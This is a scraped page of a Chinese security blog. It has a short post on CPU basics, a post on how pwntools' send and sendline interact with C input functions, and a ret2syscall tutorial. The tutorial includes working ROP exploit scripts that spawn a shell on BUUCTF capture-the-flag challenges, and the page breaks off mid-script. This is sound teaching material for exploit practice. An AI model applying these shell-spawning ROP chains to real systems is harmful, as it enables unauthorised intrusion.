<h1 id="平常说的CPU到底是个啥"><a href="#平常说的CPU到底是个啥" class="headerlink" title="平常说的CPU到底是个啥"></a>平常说的CPU到底是个啥</h1><p><strong>CPU是指中央处理器，通俗来讲就是读取指令然后执行然后再读取，用不停歇直到断电</strong>。它作为计算机系统的运算和控制核心，是信息处理、程序运行的最终执行单元。CPU里面分为三个很重要的部分，分别是ALU（算术逻辑单元），寄存器组，控制单元。</p>
<h2 id="ALU"><a href="#ALU" class="headerlink" title="ALU"></a>ALU</h2><p>是CPU的核心，因为它是负责计算的</p>
<h2 id="寄存器组"><a href="#寄存器组" class="headerlink" title="寄存器组"></a>寄存器组</h2><p>实质上就是CPU中暂时存放数据的地方，里面保存着等待处理和处理过的数据。</p>
<h2 id="控制单元"><a href="#控制单元" class="headerlink" title="控制单元"></a>控制单元</h2><p>简单来说，控制单元就是来指挥CPU内部的工作的。</p>
<h1 id="并发和并行-amp-amp-超线程"><a href="#并发和并行-amp-amp-超线程" class="headerlink" title="并发和并行&amp;&amp;超线程"></a>并发和并行&amp;&amp;超线程</h1><p>简单来说，并发就是两个事件或多个事件在一个时间依次发生；而并行则是两个时间或多个事件在一个时间同时发生。</p>
<h2 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h2><p>我们知道如果只有一个CPU的话，那么它在某一时刻也只能执行一个线程，因此它要执行多个线程，就只能把时间分成若干段，然后把每一段时间分别分配给每个线程。在某一时刻线程代码在运行时，其他线程是处于挂起状态。</p>
<h2 id="并行"><a href="#并行" class="headerlink" title="并行"></a>并行</h2><p>可如果我们拥有了多个CPU，那每一个CPU都可以在一个时刻去处理一个线程，从而系统在操作的时候，就可以同时处理多个线程（且线程之间互不抢占CPU的资源），这就是并行。</p>
<p>可是即使只有一个CPU，在用户看来，系统似乎还是可以同时处理多个线程，那是因为CPU处理的速度是在太快了，使多个线程快速交替进行，从而给人的感觉是在同一个时间处理了多个线程。</p>
<h2 id="超线程"><a href="#超线程" class="headerlink" title="超线程"></a>超线程</h2><p>如果理解了前面的并行之后，超线程（有时也被称为多线程）就不难理解了，它可以让一个CPU能够到达线程级并行计算。大概是通过备份一些CPU的硬件，比如寄存器文件和程序计数器等等，尽管此时的CPU可以同时处理两个线程，但除去刚才提到的寄存器文件和程序计数器，其他硬件依然是被共享的。</p>
<p>参考文章 <a target="_blank" rel="noopener" href="https://www.zhihu.com/question/497245883">https://www.zhihu.com/question/497245883</a><br>图片链接 <a target="_blank" rel="noopener" href="https://www.php.cn/faq/422175.html">https://www.php.cn/faq/422175.html</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/9fda4edb.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/9fda4edb.html" class="post-title-link" itemprop="url">探究pwntools中sendline的回车所造成的影响（什么时候用sendline，什么时候用send）</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-10-07 10:34:10" itemprop="dateCreated datePublished" datetime="2022-10-07T10:34:10+08:00">2022-10-07</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-05-15 08:42:45" itemprop="dateModified" datetime="2023-05-15T08:42:45+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%8E%A2%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">探究</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>在pwntools中，sendline和send都是发送数据，但是sendline是发送一行数据，换句话说就是sendline会在发送的数据末尾加一个回车。而<strong>这个回车所造成的影响，是跟对应的输入函数有关系</strong>，在做pwn题中，碰见的输入函数有scanf（”%s”)，gets()，read()，fgets(),这四个函数。我感觉最常见的应该是read函数。<strong>我们分别讨论一下这前三个函数在读取内容上的具体细节以及sendline所造成的影响</strong>。</p>
<h1 id="read函数"><a href="#read函数" class="headerlink" title="read函数"></a>read函数</h1><p><u>read(fd, buf,  count) fd是文件描述符，你可以通俗理解为从哪读；buf是一个指针，你可以理解为读到哪，count就是读入字符的数量。</u></p>
<p><font color=red><em><strong>read的内容都是从缓冲区中读取的</strong></em></font><br>如果read的fd是0，也就是说read的内容，都要从输入的缓冲区中读取。（0在文件描述符中代表着标准输入）这里要注意，<strong>读取的内容不是直接被输入到了指定的地方，而是不管你输入了多少内容，即使超过了count的限制，</strong><font color=red><strong>也依旧输入到了输入缓冲区中</strong></font><br>只是read函数没有把输入缓冲区中超过count限制的后面的内容读到指定的buf而已，<strong>也就是说此时输入缓冲区里面依然存在多余的内容。</strong>同样，<font color=red><em>也就是说如果你输入的内容是伴随着你按下回车结束，并且此时输入内容的长度还小于read函数的count那么这个回车也会被读取到read指定的第二个参数中</em></font></p>
<p>我们现在来分情况讨论read，它只有三种可能<br>第一种情况，<em>read的第三个参数大于了实际输入的内容的字节数</em><br>那么此时，<strong>输入到缓冲区的内容都被读取到了read第二个参数指定的地址</strong>，这里就要注意，我们用sendline发送是数据就相当于在原本的发送的数据结尾再加上一个回车。在pwn题中，大多时候read第二个参数指定的地址都是写到了栈里面<font color=red><em><strong>也就是说不仅仅read会把你输入的数据存入栈中，还会把这个回车（ASCII码也就是0a）存入到栈中，</strong></em></font>当然你可能大部分时候，都不会对那个存入0a的内存单元进行操作，因此是不影响我们获取shell的但事实上，此时的回车已经影响到栈中数据，<em><strong>我们平常使用sendline可能没有因为这个原因受到影响，仅仅是我们没有用到那个被0a影响的数据而已</strong></em>。<u>我们可以看到下面这个图片①处没有0a(回车)②处有0a③是正常的栈空间的内容④可以看到原本正常的内容，可最后的末尾却被覆盖成0a了</u>。最关键的就是在BUUCTF的pwnable_start这道题，这个被干扰的数据，我们还需要使用，因此在这里面对read函数的时候不可以用sendline，只能使用send。<br><img src="/../img/2706180-20220129192231393-1289193521.png"></p>
<p>第二是，我们输入的字节数，等于了count的字节（不包括回车）。<br>这就意味着，我们的数据时可以正常存入到指定的地址的，也就是说即使我们使用sendline栈中也并不会写入0a。但，这就可以高枕无忧了么？别忘了，<strong>我们输入的数据先是放入了缓冲区中，再从缓冲区中写到了指定的地址，虽然sendline的回车没有被写进去，但是回车停留在了缓冲区中。</strong>接下来如果有gets函数需要获取输入的话，<font color=red><em><strong>gets函数会因为这个缓冲区里的回车直接结束，不会从用户这里获取输入。</strong></em></font></p>
<p>第三是，我们输入的字节数，超过了count的字节，此时用这个实验来解释，再好不过了</p>
<p><img src="/../img/2706180-20220129192252767-1481032805.png"></p>
<p><em>可以发现输入了20个1，但由于read只能从缓冲区里面接收16个字节，因此执行完read函数之后，它的缓冲区里面还剩4个1和一个回车。但由于scanf的性质是，从缓冲区里面读入内容，遇见空白符停止，并且不读入空白符，因此a的内容是4个1。最后由于缓冲区只剩了一个回车，被gets读到之后，把回车丢弃了，因此直接声明了gets的结束，并且gets什么都没有读到</em>。<strong>因此当输入的字节数，超过了第三个字节的参数，就如同第二种情况一样，多出来的内容都会停留在缓冲区中（包括回车，这个回车用sendline发送payload，才会有回车）</strong></p>
<h1 id="gets函数"><a href="#gets函数" class="headerlink" title="gets函数"></a>gets函数</h1><p><em>使用 gets() 时，系统会将最后输入的换行符（也就是回车）从缓冲区中取出来，然后给舍弃，因此缓冲区中不会遗留换行符</em>。gets函数尽管会溢出，但是由于它会把自身发送的回车给从缓冲区中丢弃，<strong>因此遇见gets函数，就不用考虑sendline和send的区别。但是吧，面对这个函数，你不用sendline还不行，因为它需要回车来声明你输入的结束，尽管它会把\n丢弃</strong>。并且值得注意的就是，如果当gets溢出的话（我指的是数组溢出），那么它会在你发送所有数据之后会在最后填上一个00，如果不溢出的话，就不会出现这个00。使用gets输入的字节，正好和创建数组的大小一样的话，也会溢出（可能是因为回车的原因，尽管丢弃了，但还是会在输入的字符串结尾填上一个00），也就是说，如果用gets输入溢出数组的话，它会和read的第一种情况一样，把00写入栈中，也会干扰栈中数据。</p>
<h1 id="scanf函数"><a href="#scanf函数" class="headerlink" title="scanf函数"></a>scanf函数</h1><p>而scanf(‘%s’,c)的时候，**scanf是从第一个非空白字符（空格 换行 制表符）开始读入的，就是你输入的数据，在按下回车的之前，<font color=red><em>输入的数据都会被存储在输入缓冲区（包括回车）</em></font>**，当按下回车键之后，scanf就会开始<u>从输入缓冲区里面读取数据</u>，把读取的数据都传送到你指定的地址，直到遇见了空白符<br>然后停止。<font color=red><em><strong>它仅仅是遇见空白符停止了，但是空白符以及空白符后面的内容依然在输入缓冲区里面。</strong></em></font></p>
<p>如果再遇见gets函数的话，gets函数会从缓冲区里面继续从空白符开始读（空格），然后遇见了回车停止，并把回车丢弃，此时我们根本无法用gets函数输入，因为它在缓冲区里面就遇到了换行符。用下面的图片举例</p>
<p><img src="/../img/2706180-20220129192309307-314700424.png"></p>
<p><img src="/../img/2706180-20220129192327106-1249123632.png"><br>scanf函数也存在溢出，如果对它用sendline发送数据的话，是不可能被回车（0a）所影响栈中数据的。但是吧，通过实验发现，面对scanf的时候，不用sendline还不行，必须要用sendline，send发送的话，会在执行scanf的时候卡住。因此面对scanf(“%s”)的时候，我们用sendline发送，时刻要注意它的回车会留着缓冲区里面，可能影响接下来程序的执行情况。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><strong><u><em>使用sendline的结果取决于输入的函数</em></u></strong></p>
<p>如果是read函数的话，<font color=red>①只有当count的字节数大于你所输入的字节数，这个回车才不会产生任何的影响，而多出来的回车也会被当成输入数据正常存入栈中（如果输入的地址是栈的话）；②当count字节数等于你所输入的字节数，那么最后的sendline的回车会停留在栈中（没有在缓冲区中），此时它是不正常存入，因为这个回车的缘故，已经造成了溢出；③当count字节数小于你所输入的字节数，那么没有输入进指定地址的内容，都会停留在输入缓冲区，有可能会影响之的输入。<strong>但值得一提的是使用read函数，我们可以用send来发送数据，这样就可以确保万无一失</strong>。（</font><strong>如果是gets函数或者scanf函数</strong>，我们没有办法选择，<strong>只能使用sendline</strong>，这两种函数只有遇见sendline发送的回车，才会停止读入。<strong>gets函数会清空缓冲区里的回车，而scanf则不会清空回车。因此scanf可能会因为没有清空回车的缘故，对之后的程序输入可能造成影响，但是如果gets函数溢出了数组限制的话，会异常的在输入的字符串结尾填上一个00存入栈中。此时的00也有可能会覆盖原本栈中的数据</strong>，另外就是遇见fgets的话，也是没的选，只能用sendline</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/10ff9a38.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/10ff9a38.html" class="post-title-link" itemprop="url">ret2syscall的做题思路</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:41:57" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>​	ret2syscall需要寻找的指令的思路和构造shellcode的思路是一样的，只不过ret2syscall获取的指令算是就地取材，而ret2shellcode创造指令算是无中生有。在32位程序中，我们要系统调用，那就需要把系统调用号传入eax寄存器，然后需要把ecx和edx的寄存器给清空。最后就是需要去把参数&#x2F;bin&#x2F;sh的地址存入ebx寄存器。而我感觉ret2syscall的难点也就是在最后这个把参数地址存入ebx寄存器这里了。</p>
<h1 id="怎么把参数-x2F-bin-x2F-sh写入程序中？写到哪？"><a href="#怎么把参数-x2F-bin-x2F-sh写入程序中？写到哪？" class="headerlink" title="怎么把参数&#x2F;bin&#x2F;sh写入程序中？写到哪？"></a>怎么把参数&#x2F;bin&#x2F;sh写入程序中？写到哪？</h1><h2 id="①写到哪"><a href="#①写到哪" class="headerlink" title="①写到哪"></a>①写到哪</h2><p>首先回答写到哪，<strong>我们要尽可能写到bss段</strong>，因为在不开pie的情况下，<strong>bss段的地址是不会变的</strong>，这意味着，我们可以用IDA看一下bss段的地址然后选定一个我们写入参数的地址，然后我们exp就可以直接写上这个地址了。但是如果我们想写到栈里面，确实用gdb也可以看到写在了哪个内存单元里面，但是这个地址是会变的，把exp上写入我们刚才用gdb看到的地址。解决办法也有，那就是需要泄露程序的一个内存单元地址，然后利用偏移，来计算出我们存放&#x2F;bin&#x2F;sh参数的地址。但是这样多少有点麻烦，并且很多时候，我们是无法泄露程序中的地址的，因此我们选择写到bss段。</p>
<h2 id="②怎么写"><a href="#②怎么写" class="headerlink" title="②怎么写"></a>②怎么写</h2><p>再回答第一个问题，怎么写入程序中?目前我遇见了两种题型，分别对应的两种方法。</p>
<h3 id="怎么写——第一种方法"><a href="#怎么写——第一种方法" class="headerlink" title="怎么写——第一种方法"></a>怎么写——第一种方法</h3><p><strong>第一种方法是去搜索gadget，寻找pop [ecx]这类对地址内容操作的指令</strong>。然后我们利用如下payload可以达到将参数&#x2F;bin&#x2F;sh写入bss段。（<em>并且这部分的payload需要放到返回地址处使用</em>）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=p32(pop_ecx_addr)+p32(bss_addr)+p32(pop_[ecx]_addr)+<span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr+<span class="number">4</span>)+p32(pop_[ecx]_addr)+<span class="string">&#x27;/sh\x00&#x27;</span></span><br></pre></td></tr></table></figure>

<p>我先来解释一下这个payload。</p>
<p>首先pop_ecx_addr指的是pop ecx;ret这个指令的地址   bss_addr指的将参数写入bss段的具体地址</p>
<p>pop_[ecx]_addr指的是pop dword ptr [ecx];ret这个指令的地址 (这里我写[ecx]是为了方便理解，我记得实际的exp里面，不能使用方括号）（另外这里不一定要是ecx，别的寄存器也可以，这里只是举个例子）然后参数&#x2F;bin就是我们的参数</p>
<p><strong>至于这个bss_addr+4是上面bss_addr的地址的衔接，因为参数&#x2F;bin&#x2F;sh需要两个内存单元存放，因此在这里将上面的地址加4，就存到了下面的内存单元</strong>。最后的\x00是用来声明字符串的结束。</p>
<p>下面我画图来演示下这个过程是怎么实现的</p>
<p><img src="/../img/2706180-20220127203642840-2033345372.png"></p>
<p><em>但是这样搜寻gadget的手段，是有弊端的，因为有时候程序可能恰好就没有类似于pop [ecx]这样的指令。</em></p>
<h3 id="怎么写——第二种方法"><a href="#怎么写——第二种方法" class="headerlink" title="怎么写——第二种方法"></a>怎么写——第二种方法</h3><p>因此我们可以用第二种方法，等到可以溢出的时候，用rop，先去把返回地址处放置一个read函数，然后再把&#x2F;bin&#x2F;sh写入指定的地址（把该地址放在read函数第二个参数即可）然后再随便找一个连续三次pop的指令（不连续应该也是可以的，反正就要进行三次pop，将read函数的三个参数先从栈顶给弹出来）<br>接着再进行ret2syscall，参数传完了，剩下的只要找些gadget片段进行ret2syscall即可。如果没有read函数的话，理论来说我们是可以系统调用read函数的，但是我试了一下，当用int 0x80来系统调用read函数之后，int 0x80指令的后面不是ret指令，没有办法再去衔接后面的gadget了。不过目前还没有遇见过系统调用read函数再ret2syscall的题目。</p>
<p>当使用这两种方法其中的一种之后，传参完毕，如此剩下的就是去搜寻我们需要的gadget片段，最后系统调用即可。</p>
<h2 id="怎么搜寻gadget片段？"><a href="#怎么搜寻gadget片段？" class="headerlink" title="怎么搜寻gadget片段？"></a>怎么搜寻gadget片段？</h2><p>我们需要借助ROPgadget工具，这个需要自行安装，安装完成后。</p>
<p>比如我们要搜索int 0x80指令的片段输入ROPgadget –binary | grep ‘int 0x80’即可，如果要搜索pop eax ; ret指令片段，同理输入ROPgadget –binary | grep ‘pop eax ; ret’即可</p>
<p><img src="/../img/2706180-20220127203659117-356770839.png"></p>
<p><img src="/../img/2706180-20220127203712667-1709918883.png"></p>
<p>如此，我们就可以找到对应指令的地址了。</p>
<p>最后要介绍一下ret2syscall中怎么进行传参。除去&#x2F;bin&#x2F;sh这参数的传参方式外（该传参方式上面已经介绍过了），剩下的传参方式很单一，先去找到要传参赋值的寄存器，然后去用ROPgadget搜索pop 寄存器；ret指令片段的地址即可。</p>
<p>以eax存入11来举例</p>
<p>构造<code>payload位payload=p32(pop_eax_addr)+p32(11)</code>这样能达到效果的原因是执行pop eax的时候，栈顶就是11，此时就是把栈顶的11给弹进eax里面，即完成了传参。</p>
<p>掌握了上述这些之后，就可以去完成ret2syscall相关的题目了。</p>
<h1 id="两道例题"><a href="#两道例题" class="headerlink" title="两道例题"></a>两道例题</h1><p>最后拿两道例题来演示一下。</p>
<p>分别是BUUCTF上的inndy_rop和BUUCTF的cmcc_simplerop，这两道题分别考察了两种写入参数的方法。</p>
<p>题目链接</p>
<p>inndy_rop         <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#inndy_rop">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>cmcc_simplerop     <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#cmcc_simplerop">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>这里我分别给出wp</p>
<hr>
<h2 id="inndy-rop"><a href="#inndy-rop" class="headerlink" title="inndy_rop"></a>inndy_rop</h2><p><img src="/../img/2706180-20220127203727516-678751435.png"></p>
<p>此时看保护还是正常的，但是用IDA就发现不对劲了<br><img src="/../img/2706180-20220127203739873-417953413.png"></p>
<p><img src="/../img/2706180-20220127203751365-839458355.png"></p>
<p>上面的那个就是主函数</p>
<p>先是发现左侧的函数表有很多很多的函数，说明这个程序是静态链接，静态链接就意味着没法去ret2libc了，因为ret2libc本来就是去用动态库里面的系统函数，可是现在没有动态库了，因此就要用ret2syscall</p>
<p>此时用到上面，我提到的第一种方法将&#x2F;bin&#x2F;sh写入bss段</p>
<p>这里要注意的是搜[ecx]指令地址的时候 要这么搜，要用反斜杠用来转义<br><img src="/../img/2706180-20220127203803936-1340958560.png"></p>
<p><img src="/../img/2706180-20220127203818420-1093356739.png"></p>
<p>思路就是系统调用execve，然后把参数&#x2F;bin&#x2F;sh写入bss段</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&quot;i386&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">d=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25149</span>)</span><br><span class="line">d=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">int_0x80_addr=<span class="number">0x0806c943</span></span><br><span class="line">bss_addr=<span class="number">0x080EBB81</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment">#bss_addr=e.bss()</span></span><br><span class="line">pop_eax_addr=<span class="number">0x080b8016</span></span><br><span class="line">pop_ebx_addr=<span class="number">0x080481c9</span></span><br><span class="line">pop_ecx_addr=<span class="number">0x080de769</span></span><br><span class="line">pop_edx_addr=<span class="number">0x0806ecda</span></span><br><span class="line">pop_in_ecx_addr=<span class="number">0x0804b5ba</span></span><br><span class="line">payload=<span class="number">16</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr) <span class="comment">#利用ecx当一个媒介，以此来让/bin/sh写到bss段，最后的00用来截断，不然execve接收参数的时候，它不知道什么时候参数截止。</span></span><br><span class="line">payload+=p32(pop_in_ecx_addr)+<span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr+<span class="number">4</span>)</span><br><span class="line">payload+=p32(pop_in_ecx_addr)+<span class="string">&#x27;/sh\x00&#x27;</span></span><br><span class="line">payload+=p32(pop_eax_addr)+p32(<span class="number">0xb</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)+p32(bss_addr)<span class="comment">#把ebx存入参数/bin/sh的地址</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_edx_addr)+p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(int_0x80_addr)</span><br><span class="line">d.sendline(payload)</span><br><span class="line">d.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a>cmcc_simplerop</h2><p><img src="/../img/2706180-20220127203856048-493266564.png"></p>
<p><img src="/../img/2706180-20220127203918982-250461252.png"></p>
<p>没有canary，并且这里存在溢出，因此我们可以rop。</p>
<p><img src="/../img/2706180-20220127204005942-290500809.png"></p>
<p>但是紧接着，就发现左边是这么一坨函数，<strong>就意味着这道题是静态链接，静态链接就意味着我们没办法ret2libc，没有后门函数，没办法ret2text，开了NX保护，没办法ret2shellcode。</strong></p>
<p><strong>因此只能是ret2syscall了</strong>。</p>
<p>我们现在需要去找gadget片段。</p>
<p><strong>因为我们需要设置eax,ebx,ecx,edx这四个寄存器的参数，因此需要去分别找pop这四个寄存器的指令。</strong></p>
<p><img src="/../img/2706180-20220127204033314-1369511097.png"></p>
<p>这里直接就发现了连续pop三个寄存器的指令，比较nice。</p>
<p><img src="/../img/2706180-20220127204105424-1865663775.png"></p>
<p>寄存器找完了，现在最大的问题就是怎么把&#x2F;bin&#x2F;sh给传进去？</p>
<p>这道题没有类似于pop [ecx]这类指令，因此我们只能另辟蹊径。</p>
<p><strong>因为存在read函数(如果没有read函数的话，那就系统调用，不过我试了一下，没成功，但原理上是可行的)<strong>，因此我们可以先把read的地址放到返回地址，再执行一次read，将参数写入我们指定的bss段地址，（</strong>为什么要写入bss段，是因为没开pie的情况下，bss段地址是不变的，并且这道题的bss段是可写，这样我们写入参数之后，直接再拿写入的那个bss地址当做ebx的参数即可，如果是写入栈中的话，还需要泄露栈中地址</strong>）</p>
<p> 并且值得一提的是，我们<font color=red><strong>之后使用pop eax+p32(0xb)这种指令的前提是此时栈顶要是0xb才可以，但是当我们执行read之后，它的三个参数都是在栈顶的，因此我们需要pop三次，把read的参数先给弹出来，这样才能顺理传之后的参数</strong></font>。</p>
<p> <strong>最后要注意的一个点就是，这道题用IDA看，距离返回地址是0x18,但是用gdb调试一下发现，它距离返回地址实际上是0x20。</strong></p>
<p> 最后就是exp了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27707</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">pop_eax=<span class="number">0x080bae06</span></span><br><span class="line">pop_ebx=<span class="number">0x080481c9</span></span><br><span class="line">pop_ecx_ebx=<span class="number">0x0806e851</span></span><br><span class="line">pop_edx=<span class="number">0x0806e82a</span></span><br><span class="line">int_0x80=<span class="number">0x080493e1</span></span><br><span class="line">bss_addr=<span class="number">0x080EAFF0</span></span><br><span class="line">read_addr=<span class="number">0x0806CD50</span></span><br><span class="line">pop_edx_ecx_ebx=<span class="number">0x0806e850</span></span><br><span class="line">payload=<span class="number">0x20</span>*<span class="string">&#x27;a&#x27;</span>+p32(read_addr)+p32(pop_edx_ecx_ebx)<span class="comment">#这三个pop处于read函数的返回地址，连续pop三次，把栈顶的内容弹出来</span></span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(bss_addr)+p32(<span class="number">8</span>)<span class="comment">#read函数的参数</span></span><br><span class="line">payload+=p32(pop_eax)+p32(<span class="number">11</span>)+p32(pop_edx_ecx_ebx)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bss_addr)<span class="comment">#弹给eax的内容是11，因为11是32位程序execve的系统调用号</span></span><br><span class="line">payload+=p32(int_0x80)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#这里一定要输入这个\x00去截断</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>##picoctf_2018_can_you_gets_me</p>
<p><img src="/../img/2706180-20220303194850099-1407586466.png"></p>
<p><img src="/../img/2706180-20220303194913108-59758844.png"></p>
<p>发现是静态链接，之前静态链接就是直接去用ropgadget搜了ropchain，然后我这道题直接搜了一下。<br>用下面这个命令搜（a是文件名）<br><img src="/../img/2706180-20220303195629484-228134511.png"><br>  <img src="/../img/2706180-20220303194931739-320603106.png"></p>
<p> <img src="/../img/2706180-20220303194955331-2123755447.png"><br>发现没有canary，并且有溢出<br>那就没少好说的了，看一下溢出偏移</p>
<p><img src="/../img/2706180-20220303194941901-2106523077.png"></p>
<p>发现溢出偏移为28，然后直接打就行了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack  <span class="comment">#这里必须要引入这个包，不然是打不通的</span></span><br><span class="line">context(arch = <span class="string">&quot;i386&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29254</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./a&#x27;)</span></span><br><span class="line">offset=<span class="number">28</span></span><br><span class="line">p=offset*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">&#x27;//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword 